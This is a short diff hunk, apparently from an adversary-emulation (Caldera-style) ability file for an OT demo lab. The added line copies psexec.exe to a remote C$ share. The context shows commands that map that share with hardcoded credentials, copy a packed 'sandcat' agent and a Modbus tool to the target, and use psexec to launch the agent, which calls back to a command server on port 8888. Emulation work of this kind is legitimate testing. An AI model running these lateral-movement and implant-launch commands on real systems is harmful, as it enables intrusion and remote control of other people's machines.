@@ -12,6 +12,7 @@
           net use \\172.18.24.12\C$ /user:txone tx1otdemo;
           Copy-Item -Path "C:\Users\Public\sandcat-upx.exe" -Destination "\\172.18.24.12\C$\Users\Public\" -Force;
           Copy-Item -Path "C:\Users\Public\modbus_cli.exe" -Destination "\\172.18.24.12\C$\Users\Public\" -Force;
+          Copy-Item -Path "C:\Users\Public\psexec.exe" -Destination "\\172.18.24.12\C$\Users\Public\" -Force;
           Start-Process -FilePath "C:\Users\Public\psexec.exe" -ArgumentList '\\172.18.24.12', '-u', 'txone', '-p', 'tx1otdemo', 'cmd', '/c', 'start "" "C:\Users\Public\sandcat-upx.exe" -server http://172.18.25.10:8888 -group tx1' -NoNewWindow;
         payloads:
           - sandcat-upx.exe
